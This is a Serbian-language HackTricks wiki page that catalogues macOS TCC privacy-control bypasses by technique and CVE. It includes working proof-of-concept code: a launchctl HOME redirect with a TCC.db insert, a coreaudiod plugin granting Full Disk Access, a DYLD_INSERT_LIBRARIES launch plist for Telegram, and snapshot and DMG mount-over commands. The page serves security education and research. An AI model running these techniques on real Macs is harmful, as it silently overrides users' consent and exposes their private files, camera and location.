# macOS TCC Bypasses

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Po funkcionalnosti

### Bypass za pisanje

Ovo nije zaobilazak, to je samo kako TCC radi: **Ne štiti od pisanja**. Ako Terminal **nema pristup čitanju Desktop-a korisnika, i dalje može pisati u njega**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**Prošireni atribut `com.apple.macl`** dodaje se novom **fajlu** kako bi dao pristup **aplikaciji kreatora** da ga pročita.

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC prozora** kako bi korisnik **prihvatio** bez primetnosti. Možete pronaći PoC u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/rs/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Zahtev po proizvoljnom imenu

Napadač može **kreirati aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** i zatražiti pristup nekoj TCC zaštićenoj lokaciji. Korisnik će pomisliti da legitimna aplikacija traži ovaj pristup.\
Osim toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i staviti lažnu na nju**, tako da kada korisnik klikne na lažnu (koja može koristiti istu ikonu) može pozvati legitimnu, zatražiti TCC dozvole i izvršiti malver, čineći da korisnik veruje da je legitimna aplikacija zatražila pristup.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC u:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

Podrazumevano, pristup putem **SSH je imao "Pristup celom disku"**. Da biste onemogućili ovo, morate imati navedeno ali onemogućeno (uklanjanje sa liste neće ukloniti te privilegije):

![](<../../../../../.gitbook/assets/image (569).png>)

Ovde možete pronaći primere kako su neki **malveri uspeli da zaobiđu ovu zaštitu**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Imajte na umu da sada, da biste mogli omogućiti SSH, potrebno je imati **Pristup celom disku**
{% endhint %}

### Obrada ekstenzija - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se fajlovima kako bi dala **određenoj aplikaciji dozvole da ga pročita**. Ovaj atribut se postavlja kada se **prevuče i ispusti** fajl preko aplikacije, ili kada korisnik **dvaput klikne** na fajl da ga otvori sa **podrazumevanom aplikacijom**.

Stoga, korisnik bi mogao **registrovati zlonamernu aplikaciju** da obradi sve ekstenzije i pozove Launch Services da **otvori** bilo koji fajl (tako da će zlonamerni fajl dobiti pristup za čitanje).

### iCloud

Pravo **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC servisom koji će **pružiti iCloud tokene**.

**iMovie** i **Garageband** imali su ovo pravo i drugi koji su dozvoljeni.

Za više **informacija** o eksploataciji za **dobijanje icloud tokena** iz tog prava, pogledajte predavanje: [**#OBTS v5.0: "Šta se dešava na vašem Mac-u, ostaje na Apple-ovom iCloud-u?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatizacija

Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** moći će da **kontroliše druge aplikacije**. To znači da bi mogla **zloupotrebiti dozvole dodeljene drugim aplikacijama**.

Za više informacija o Apple skriptama pogledajte:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Na primer, ako aplikacija ima **dozvolu za Automatizaciju nad `iTerm`**, na primer u ovom primeru **`Terminal`** ima pristup nad iTerm-om:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Nad iTerm-om

Terminal, koji nema Pristup celom disku, može pozvati iTerm, koji ima, i koristiti ga za izvršavanje akcija:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### Preko Findera

Ili ako aplikacija ima pristup preko Findera, može koristiti skriptu poput ove:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Po ponašanju aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** u korisničkom prostoru koristi **`HOME`** **env** promenljivu za pristup TCC korisničkoj bazi podataka iz: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovom Stack Exchange postu](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i zato što TCC daemon radi putem `launchd` unutar trenutne korisničke domene, moguće je **kontrolisati sve environment promenljive** koje mu se prosleđuju.\
Stoga, **napadač može postaviti `$HOME` environment** promenljivu u **`launchctl`** da pokazuje na **kontrolisani** **direktorijum**, **restartovati** **TCC** daemon, a zatim **direktno izmeniti TCC bazu podataka** kako bi sebi dao **sve dostupne TCC privilegije** bez ikakvog upita korisniku.\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Beleške

Beleške su imale pristup TCC zaštićenim lokacijama, ali kada se napravi beleška, ona se **kreira na lokaciji koja nije zaštićena**. Dakle, mogli ste zatražiti od beleški da kopiraju zaštićenu datoteku u belešku (tako da se nalazi na lokaciji koja nije zaštićena) i zatim pristupiti datoteci:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokacija

Binarni fajl `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imao je dozvolu `com.apple.private.nullfs_allow` koja mu je omogućila da kreira **nullfs** mount i imao je dozvolu `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`** za pristup svakoj datoteci.

Bilo je moguće dodati karantin atribut za "Library", pozvati XPC servis **`com.apple.security.translocation`** i zatim mapirati Library u **`$TMPDIR/AppTranslocation/d/d/Library`** gde su svi dokumenti unutar Library-ja mogli biti **pristupljeni**.

### CVE-2023-38571 - Muzika & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muzika`** ima zanimljivu funkciju: Kada se pokrene, uvešće datoteke koje su spuštene u **`~/Muzika/Muzika/Media.localized/Automatski dodaj u Muziku.localized`** u korisnikov "medijski biblioteku". Osim toga, poziva nešto poput: **`rename(a, b);`** gde su `a` i `b`:

* `a = "~/Muzika/Muzika/Media.localized/Automatski dodaj u Muziku.localized/mojafajl.mp3"`
* `b = "~/Muzika/Muzika/Media.localized/Automatski dodaj u Muziku.localized/Nije dodato.localized/2023-09-25 11.06.28/mojafajl.mp3`

Ova **`rename(a, b);`** funkcionalnost je ranjiva na **Trku stanja**, jer je moguće staviti lažnu **TCC.db** datoteku unutar foldera `Automatski dodaj u Muziku.localized`, a zatim kada se kreira novi folder(b) da se kopira datoteka, obriše i usmeri ka **`~/Biblioteka/Podrška Aplikacije/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Ako je **`SQLITE_SQLLOG_DIR="putanja/folder"`** to u osnovi znači da će **svaka otvorena baza podataka biti kopirana na tu putanju**. U ovom CVE-u, ova kontrola je zloupotrebljena kako bi se **pisalo** unutar **SQLite baze podataka** koja će biti **otvorena od strane procesa sa FDA bazom podataka TCC**, a zatim zloupotrebljena **`SQLITE_SQLLOG_DIR`** sa **simboličkom vezom u imenu datoteke** tako da kada se ta baza podataka **otvori**, korisnikova **TCC.db će biti prebrisana** otvorenom bazom.

**Više informacija** [**u objašnjenju**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i** [**u predavanju**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Ako je postavljena okolina promenljiva **`SQLITE_AUTO_TRACE`**, biblioteka **`libsqlite3.dylib`** će početi **logovati** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.

Nekoliko Apple aplikacija je koristilo ovu biblioteku za pristup informacijama zaštićenim TCC-om.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Ova **env promenljiva se koristi od strane `Metal` okvira** koji je zavistan od različitih programa, najznačajnije `Music`, koji ima FDA.

Postavljanjem sledećeg: `MTL_DUMP_PIPELINES_TO_JSON_FILE="putanja/naziv"`. Ako je `putanja` validan direktorijum, bag će biti aktiviran i možemo koristiti `fs_usage` da vidimo šta se dešava u programu:

* biće `otvoren()` fajl nazvan `putanja/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
* jedan ili više `write()` će upisati sadržaj u fajl (mi ne kontrolišemo ovo)
* `putanja/.dat.nosyncXXXX.XXXXXX` će biti preimenovan u `putanja/naziv`

To je privremeni upis fajla, praćen **`preimenovanjem(stari, novi)`** **što nije sigurno.**

Nije sigurno jer mora **da reši stare i nove putanje odvojeno**, što može potrajati i biti ranjivo na Trku Stanja. Za više informacija možete proveriti `xnu` funkciju `renameat_internal()`.

{% hint style="danger" %}
Dakle, ako privilegovani proces preimenuje iz foldera koji kontrolišete, možete dobiti RCE i naterati ga da pristupi drugom fajlu ili, kao u ovom CVE-u, otvoriti fajl koji je privilegovana aplikacija kreirala i sačuvati FD.

Ako preimenovanje pristupi folderu koji kontrolišete, dok ste modifikovali izvorni fajl ili imate FD do njega, promenite destinacioni fajl (ili folder) da pokazuje na simbolički link, tako da možete pisati kad god želite.
{% endhint %}

Ovo je bio napad u CVE-u: Na primer, da prepišemo korisnikov `TCC.db`, možemo:

* kreirati `/Users/hacker/ourlink` da pokazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
* kreirati direktorijum `/Users/hacker/tmp/`
* postaviti `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* aktivirati bag pokretanjem `Music` sa ovom env varijablom
* uhvatiti `open()` `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
* ovde takođe `otvoriti()` ovaj fajl za pisanje, i zadržati file deskriptor
* atomički zameniti `/Users/hacker/tmp` sa `/Users/hacker/ourlink` **u petlji**
* ovo radimo da bismo maksimizirali šanse za uspeh jer je prozor trke prilično kratak, ali gubitak trke ima zanemarljive posledice
* sačekati malo
* testirati da li smo imali sreće
* ako ne, ponovo pokrenuti od početka

Više informacija na [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Sada, ako pokušate da koristite env promenljivu `MTL_DUMP_PIPELINES_TO_JSON_FILE` aplikacije se neće pokrenuti
{% endhint %}

### Apple Remote Desktop

Kao root možete omogućiti ovu uslugu i **ARD agent će imati pun pristup disku** što korisnik može zloupotrebiti da natera da kopira novu **TCC korisničku bazu podataka**.

## Preko **NFSHomeDirectory**

TCC koristi bazu podataka u HOME folderu korisnika da kontroliše pristup resursima specifičnim za korisnika na **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Stoga, ako korisnik uspe da ponovo pokrene TCC sa $HOME env promenljivom koja pokazuje na **različit folder**, korisnik bi mogao kreirati novu TCC bazu podataka u **/Library/Application Support/com.apple.TCC/TCC.db** i prevariti TCC da odobri bilo koju TCC dozvolu bilo kojoj aplikaciji.

{% hint style="success" %}
Imajte na umu da Apple koristi postavku sačuvanu unutar korisničkog profila u atributu **`NFSHomeDirectory`** za **vrednost `$HOME`**, tako da ako kompromitujete aplikaciju sa dozvolama za modifikaciju ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete **oružati** ovu opciju sa TCC zaobilaskom.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) da modifikuje **HOME** folder korisnika.

1. Dobiti _csreq_ blob za ciljnu aplikaciju.
2. Ubaciti lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blobom.
3. Izvezite korisnikov unos Directory Services-a sa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifikujte unos Directory Services-a da promenite korisnikov home direktorijum.
5. Uvezite modifikovani unos Directory Services-a sa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite korisnikov _tccd_ i ponovo pokrenite proces.

Drugi POC koristi **`/usr/libexec/configd`** koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, napadač bi mogao specificirati **prilagođeni Bundle za učitavanje**. Stoga, eksploatacija **zamenjuje** metodu **`dsexport`** i **`dsimport`** za promenu korisnikovog home direktorijuma sa **`configd` kodnom injekcijom**.

Za više informacija pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Ubacivanjem procesa

Postoje različite tehnike za ubacivanje koda unutar procesa i zloupotrebu njegovih TCC privilegija:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Osim toga, najčešće ubacivanje procesa zaobiđući TCC je putem **dodataka (učitavanje biblioteke)**.\
Dodaci su dodatni kod obično u obliku biblioteka ili plist-a, koji će biti **učitani od strane glavne aplikacije** i izvršavati se pod njenim kontekstom. Stoga, ako glavna aplikacija ima pristup TCC ograničenim fajlovima (putem odobrenih dozvola ili privilegija), **prilagođeni kod će takođe imati pristup**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je privilegiju **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala je dodatke sa ekstenzijom **`.daplug`** i **nije imala ojačan** runtime.

Da bi se iskoristio ovaj CVE, **`NFSHomeDirectory`** je **promenjen** (zloupotrebljavajući prethodnu privilegiju) kako bi se moglo **preuzeti korisničku TCC bazu podataka** zaobišavajući TCC.

Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binarni fajl **`/usr/sbin/coreaudiod`** imao je dozvole `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prva dozvola omogućavala je **ubacivanje koda**, a druga mu je dala pristup za **upravljanje TCC**.

Ovaj binarni fajl je omogućavao učitavanje **dodatnih plug-ina** iz foldera `/Library/Audio/Plug-Ins/HAL`. Stoga je bilo moguće **učitati dodatak i zloupotrebiti TCC dozvole** pomoću ovog PoC-a:

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```

Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Dodaci sloja apstrakcije uređaja (DAL)

Sistemski programi koji otvaraju video strim preko Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **u proces ove dodatke** smeštene u `/Library/CoreMediaIO/Plug-Ins/DAL` (neograničeno SIP-om).

Dovoljno je samo sačuvati tamo biblioteku sa uobičajenim **konstruktorom** da bi se uspešno izvršio **ubacivanje koda**.

Nekoliko Apple aplikacija je bilo ranjivo na ovo.

### Firefox

Aplikacija Firefox je imala dozvole `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```

Za više informacija o tome kako lako iskoristiti ovo [**proverite originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je dozvole **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućilo ubacivanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao dozvole **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, tako da je bilo moguće zloupotrebiti ih kako bi se **dobio pristup njenim dozvolama** poput snimanja kamerom. Možete [**pronaći payload u analizi**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Primetite kako se koristi env promenljiva da bi se učitao library, kreiran je **custom plist** da bi se ubacio ovaj library i **`launchctl`** je korišćen da ga pokrene:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Pomoću otvorenih poziva

Moguće je pozvati **`open`** čak i dok je sandbox aktiviran

### Terminalni skriptovi

Često je uobičajeno dati terminalu **Pristup punom disku (FDA)**, barem na računarima koje koriste tehničari. I moguće je pozvati skriptove **`.terminal`** koristeći ga.

**`.terminal`** skriptovi su plist fajlovi poput ovog sa komandom za izvršavanje u ključu **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```

Aplikacija bi mogla napisati terminalni skriptu na lokaciji poput /tmp i pokrenuti je sa komandom poput:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Montiranjem

### CVE-2020-9771 - TCC zaobilazak i eskalacija privilegija putem montiranja `mount_apfs`

**Bilo koji korisnik** (čak i neprivilegovani) može kreirati i montirati snapshot vremenske mašine i **pristupiti SVIM datotekama** tog snimka.\
Jedino što je potrebno je da aplikacija koja se koristi (kao što je `Terminal`) ima **Pristup celom disku** (Full Disk Access - FDA) (`kTCCServiceSystemPolicyAllfiles`) koji mora biti odobren od strane administratora.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Detaljnije objašnjenje možete [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montiranje preko TCC fajla

Čak i ako je TCC DB fajl zaštićen, bilo je moguće **montirati preko direktorijuma** novi TCC.db fajl:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Proverite **potpunu eksploataciju** u [**originalnom writeup-u**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i montiranje na drugom mestu zaobilazeći TCC zaštite.

### Lokacijske usluge

Postoji treća TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente koji su dozvoljeni da **pristupe lokacijskim uslugama**.\
Folder **`/var/db/locationd/` nije bio zaštićen od montiranja DMG-a** pa je bilo moguće montirati naš plist.

## Preko aplikacija koje se pokreću pri pokretanju sistema

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Preko grep komande

U nekoliko situacija, fajlovi će čuvati osetljive informacije poput email adresa, brojeva telefona, poruka... na nezaštićenim lokacijama (što se smatra ranjivošću u Apple-u).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Sintetički klikovi

Ovo više ne funkcioniše, ali je [**funkcionisalo u prošlosti**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Drugi način korišćenjem [**CoreGraphics događaja**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
